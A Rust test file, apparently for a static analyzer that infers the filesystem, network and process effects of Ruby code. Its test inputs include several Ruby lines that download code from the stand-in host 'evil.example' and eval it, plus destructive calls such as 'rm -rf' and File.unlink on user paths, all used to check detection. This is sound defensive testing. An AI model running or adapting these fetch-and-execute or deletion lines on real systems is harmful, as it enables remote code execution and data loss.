            r#"File.send(:unlink, "/tmp/binary")"#,
            "filesystem.delete",
            "/tmp/binary",
        ),
        (
            r#"File.public_send("truncate", "/tmp/state", 0)"#,
            "filesystem.write",
            "/tmp/state",
        ),
    ] {
        let plan = ruby(source);
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == operation && fs_path(effect) == Some(path)),
            "{source}: {:?}",
            plan.effects
        );
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| fs_path(effect) == Some("0"))
        );
        assert!(
            plan.boundaries.is_empty(),
            "{source}: {:?}",
            plan.boundaries
        );
        for domain in ["environment", "filesystem", "network", "process"] {
            assert!(plan.coverage.is_full(&Domain::new(domain)), "{source}");
        }
    }
    for source in [
        r#"File = Object.new; File.send(:unlink, "/tmp/false")"#,
        r#"class File; def self.truncate(*args); end; end; File.truncate("/tmp/false", 0)"#,
        r#"receiver.send(:unlink, "/tmp/false")"#,
        r#"File.send(ENV["METHOD"], "/tmp/false")"#,
        r#"File.send(:unlink, "/tmp/\xff")"#,
    ] {
        let plan = ruby(source);
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| fs_path(effect) == Some("/tmp/false")),
            "{source}"
        );
        if !source.starts_with("class File") {
            assert!(
                plan.boundaries.iter().any(|boundary| matches!(
                    boundary.reason.as_str(),
                    "unmodeled_dynamic_code" | "unresolved_call"
                )),
                "{source}"
            );
        }
    }
}

#[test]
fn eval_of_a_web_response_body_runs_the_downloaded_code() {
    use effinterp_proto::{CausalReason, OccurrenceKind};
    let run = |source: &str| {
        let plan = Engine::new()
            .with_causality_detail(true)
            .analyze(&Subject::Source {
                dialect: None,
                language: "ruby".to_string(),
                source: source.to_string(),
                cwd: Some("/w".to_string()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        plan
    };
    for source in [
        "require 'net/http'; eval(Net::HTTP.get(URI('https://evil.example/x.rb')))",
        "require 'net/http'; eval Net::HTTP.get('evil.example', '/x.rb')",
        "require 'net/http'; Kernel.eval(Net::HTTP.get_response(URI.parse('https://evil.example/x.rb')).body)",
        "require 'open-uri'; eval(URI.open('https://evil.example/x.rb').read)",
        "require 'open-uri'; eval(URI('https://evil.example/x.rb').read)",
        // A body held in a local, and the other evaluators of a string.
        "require 'net/http'; code = Net::HTTP.get(URI('https://evil.example/x.rb')); Kernel.eval(code)",
        "require 'net/http'; String.class_eval(Net::HTTP.get(URI('https://evil.example/x.rb')))",
        "require 'net/http'; TOPLEVEL_BINDING.eval(Net::HTTP.get(URI('https://evil.example/x.rb')))",
    ] {
        let plan = run(source);
        let graph = plan.causality.graph.as_ref().expect("causality detail");
        let occurrence = |id: &effinterp_proto::OccurrenceId| {
            graph
                .nodes
                .iter()
                .find(|node| &node.id == id)
                .and_then(|node| match &node.occurrence {
                    OccurrenceKind::ResourceInteraction {
                        operation,
                        resource,
                        ..
                    } => Some((operation.0.as_str(), resource)),
                    _ => None,
                })
        };
        assert!(
            graph.edges.iter().any(|edge| {
                edge.reason == CausalReason::ResourceTransfer
                    && matches!(occurrence(&edge.from), Some(("network.request", ResourceExpr::Concrete {
                        identity: ResourceIdentity::NetworkEndpoint { host, .. },
                    })) if host == "evil.example")
                    && matches!(occurrence(&edge.to), Some(("process.code_execution", _)))
            }),
            "{source}"
        );
        // The downloaded code itself stays unknown.
        assert!(
            plan.boundaries
                .iter()
                .any(|boundary| boundary.reason.as_str() == "unmodeled_dynamic_code"),
            "{source}"
        );
    }
    for source in [
        "require 'net/http'; puts Net::HTTP.get(URI('https://evil.example/x.rb'))",
        "require 'net/http'; code = Net::HTTP.get(URI('https://evil.example/x.rb')); code = '1'; eval(code)",
    ] {
        assert!(
            run(source)
                .effects
                .iter()
                .all(|effect| effect.operation.0 != "process.code_execution"),
            "{source}"
        );
    }
}

#[test]
fn literal_eval_is_nested_but_runtime_source_and_shadowed_bindings_are_opaque() {
    let plan = ruby(r#"eval("File.unlink(\"/tmp/nested\")")"#);
    let delete = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .unwrap();
    assert_eq!(fs_path(delete), Some("/tmp/nested"));
    assert!(!delete.provenance.is_empty());
    assert!(
        !plan
            .boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "unmodeled_dynamic_code")
    );
    for source in [
        r#"eval(ARGV[0])"#,
        r#"eval('File.unlink("/tmp/\xff")')"#,
        r#"eval("File.unlink(#{ARGV[0]})")"#,
        r#"File = Object.new; eval('File.unlink("/tmp/false")')"#,
        r#"eval('File = Object.new; File.unlink("/tmp/false")')"#,
        r#"def eval(source); end; eval('File.unlink("/tmp/false")')"#,
    ] {
        let plan = ruby(source);
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.delete"),
            "{source}"
        );
        if !source.starts_with("def eval") {
            assert_eq!(
                plan.boundaries
                    .iter()
                    .filter(|boundary| boundary.reason.as_str() == "unmodeled_dynamic_code")
                    .count(),
                1,
                "{source}"
            );
        }
    }
    let changed =
        ruby(r#"target = "/before"; eval('target = "/after"'); File.truncate(target, 0)"#);
    assert!(
        !changed
            .effects
            .iter()
            .any(|effect| fs_path(effect) == Some("/before"))
    );
    assert!(
        changed
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.write")
    );
    let mut source = "File.unlink('/too-deep')".to_string();
    for _ in 0..10 {
        source = format!("eval({})", serde_json::to_string(&source).unwrap());
    }
    let plan = ruby(&source);
    assert!(
        !plan
            .effects
            .iter()
            .any(|effect| fs_path(effect) == Some("/too-deep"))
    );
    assert!(
        plan.boundaries
            .iter()
            .any(|boundary| boundary.class == BoundaryClass::Limit)
    );
}

#[test]
fn system_argv0_pair_runs_the_program() {
    // `[prog, argv0]` renames the child; `prog` is what runs.
    let plan = ruby(r#"system(["rm", "rm"], "-rf", "/tmp/x")"#);
    let deletes: Vec<_> = plan
        .effects
        .iter()
        .filter(|effect| effect.operation.0 == "filesystem.delete")
        .map(fs_path)
        .collect();
    assert_eq!(deletes, [Some("/tmp/x")], "{:?}", plan.effects);
}

#[test]
fn env_home_resolves_from_host_context() {
    let analyze = |source: &str| {
        let mut context = effinterp_proto::HostContext::default();
        context.env.insert("HOME".into(), "/home/u".into());
        Engine::new()
            .analyze(&Subject::Source {
                dialect: None,
                language: "ruby".to_string(),
                source: source.to_string(),
                cwd: Some("/w".to_string()),
                context,
            })
            .unwrap()
    };
    for source in [
        r#"File.unlink(File.join(ENV["HOME"], ".cfg/a"))"#,
        r#"File.delete(File.join(ENV.fetch("HOME"), ".cfg/a"))"#,
    ] {
        let plan = analyze(source);
        validate_plan(&plan).unwrap();
        assert_eq!(
            fs_path(one_effect(&plan, "filesystem.delete")),
            Some("/home/u/.cfg/a"),
            "{source}"
        );
        // `File.join` is path arithmetic, not an unmodeled call.
        assert!(
            plan.boundaries.is_empty(),
            "{source}: {:?}",
            plan.boundaries
        );
    }
    // Once the program writes ENV, the host value no longer applies.
    let plan = analyze(r#"ENV["HOME"] = "/tmp"; File.unlink(File.join(ENV["HOME"], "a"))"#);
    assert_eq!(fs_path(one_effect(&plan, "filesystem.delete")), None);
}
